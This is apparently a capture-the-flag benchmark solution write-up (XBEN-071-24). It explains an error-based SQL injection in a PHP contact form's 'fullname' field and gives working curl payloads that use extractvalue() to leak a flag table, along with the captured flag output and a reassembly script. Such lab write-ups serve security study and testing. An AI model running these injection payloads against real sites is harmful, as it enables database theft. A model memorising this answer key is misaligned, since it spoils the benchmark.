# XBEN-071-24 — SQL make mistakes

> **Live PoC:** Start the benchmark with `make run`, then run `make poc` from its benchmark directory. The runner discovers the current published port and prints only the flag recovered from the running service.

**Vulnerability class:** Error-based SQL injection (string concatenation into a prepared
statement) via `extractvalue()` exfiltration.

## Summary

`app/send.php` handles the contact form. The first query (`$check_sql`) is a properly
parameterized prepared statement. However the second query mixes parameterized placeholders
with **raw string interpolation** of the `fullname` POST field:

```php
$name = $_POST['fullname'];
...
$sql = "SELECT * FROM contact WHERE message = ? AND email = ? AND phone = ? AND subject = ? AND name = '$name'";
$stmt = $conn->prepare($sql);
...
$stmt->execute();
$result = $stmt->get_result();
$rows = $result->fetch_all(MYSQLI_ASSOC);
```

`$name` is never escaped, so it can break out of the `'...'` literal in the `name = '$name'`
clause. The query results (`$rows`) are never echoed anywhere in the page, so this is not a
UNION-based/visible-output injection — but the app image is `php:8.3.6-apache`, whose modern
mysqli driver defaults to **exception mode** (`mysqli_report(MYSQLI_REPORT_ERROR |
MYSQLI_REPORT_STRICT)`), and `display_errors` is on, so an uncaught `mysqli_sql_exception`
during `$stmt->execute()` is printed straight to the response, including the driver's error
text. This gives a classic **error-based blind SQLi** oracle: injecting
`extractvalue(1, concat(0x7e, (SELECT ...)))` forces MySQL to throw an `XPATH syntax error`
whose message contains up to 32 characters of arbitrary subquery output (the `~` separator
plus the data), which is echoed in the PHP fatal-error page. The database schema
(`mysql/backup.sql`) defines a `flag` table (`flag.flag`), which is read this way, 31
characters at a time using `SUBSTRING()`.

## Exploit

```bash
PORT=63330

# 1. Find the flag length
curl -s -X POST "http://localhost:$PORT/send.php" \
  --data-urlencode "fullname=x' AND extractvalue(1,concat(0x7e,(SELECT LENGTH(flag) FROM flag LIMIT 1)))-- -" \
  --data-urlencode "email=a@a.com" --data-urlencode "phone=123" \
  --data-urlencode "subject=s" --data-urlencode "message=m" --data-urlencode "submit=1" \
  | grep -o "XPATH syntax error: '[^']*'"
# -> '~70'   (flag is 70 characters long)

# 2. Dump it in 31-char windows (extractvalue truncates its output to 32 chars,
#    1 of which is consumed by the '~' separator)
for start in 1 30 59; do
  curl -s -X POST "http://localhost:$PORT/send.php" \
    --data-urlencode "fullname=x' AND extractvalue(1,concat(0x7e,(SELECT SUBSTRING(flag,$start,32) FROM flag LIMIT 1)))-- -" \
    --data-urlencode "email=a@a.com" --data-urlencode "phone=123" \
    --data-urlencode "subject=s" --data-urlencode "message=m" --data-urlencode "submit=1" \
    | grep -o "XPATH syntax error: '[^']*'"
done
```

### Captured output

```
XPATH syntax error: '~70'
XPATH syntax error: '~FLAG{0aa3ada534b6aa7033dddbf624'
XPATH syntax error: '~24c076c48afd97407bcab9b1d6acb6b'
XPATH syntax error: '~6bc502fa240}'
```

Stitching the overlapping windows together by absolute position:

```python
s = {}
def place(chunk, start):
    for i, ch in enumerate(chunk):
        s[start + i] = ch
place('FLAG{0aa3ada534b6aa7033dddbf624', 1)
place('24c076c48afd97407bcab9b1d6acb6b', 30)
place('6bc502fa240}', 59)
print(''.join(s[i] for i in range(1, 71)))
```

yields the full flag.
